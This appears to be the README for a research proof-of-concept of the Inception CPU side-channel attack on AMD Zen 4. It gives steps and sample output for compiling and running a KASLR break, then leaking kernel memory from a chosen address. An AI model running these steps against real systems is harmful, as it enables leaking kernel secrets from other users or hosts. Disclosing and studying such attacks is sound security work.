This folder contains the PoC exploit of Inception for Zen 4.

1. Compile the workload and inception binaries

Use the `compile.sh` script (make sure you set the `CORE1` and `CORE2` to sibling threads.

Changing SET (0 - 63) can sometimes improve the performance of the exploit.

2. Run the Inception KASLR break:

./inception_kaslr <mode>

`<mode>` is optional and if it's omitted will run on against the Ubuntu Linux kernel 5.19.0-28-generic image.
To run against the kernel module in `kmod` specify 1, to run within a guest against a host running the `kmod`
module specify 2.

Note that finding the physical address of the reload buffer (second step of inception_kaslr) can take a few minutes,
depending on the size of your physical memory.

3. Lastly, run Inception, and pass the kernel text, physmap address and a kernel address from which you want to leak:

./inception <INSERT KERNEL TEXT> <INSERT PHYSMAP ADDRESS> <INSERT KERNEL ADDRESS> <mode>

The results are printed to stdout and are also stored in data.bin.
Before running, make sure transparent hugepages are enabled, since we rely on this feature for
reducing entropy (not a strict requirement of Inception).

To enable transparent hugepages:
```
echo always > /sys/kernel/mm/transparent_hugepage/enabled
echo 512 > /proc/sys/vm/nr_hugepages
```

Optional: The kmod in ./kmod can be installed to get an example kernel address from which we can leak:

cd ../kmod; make install; dmesg | tail -n 10; cd ../zen_4

The output of inception_kaslr should look like the following:

.............
Leaked _text: 0xffffffff8ea00000
...........
Physical: 0x2ba00000
...............................................
Leaked physmap: 0xffff9f6340000000
Broke KASLR in 216 seconds

When leaking from the provided kmod, the output of inception should look something like this:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
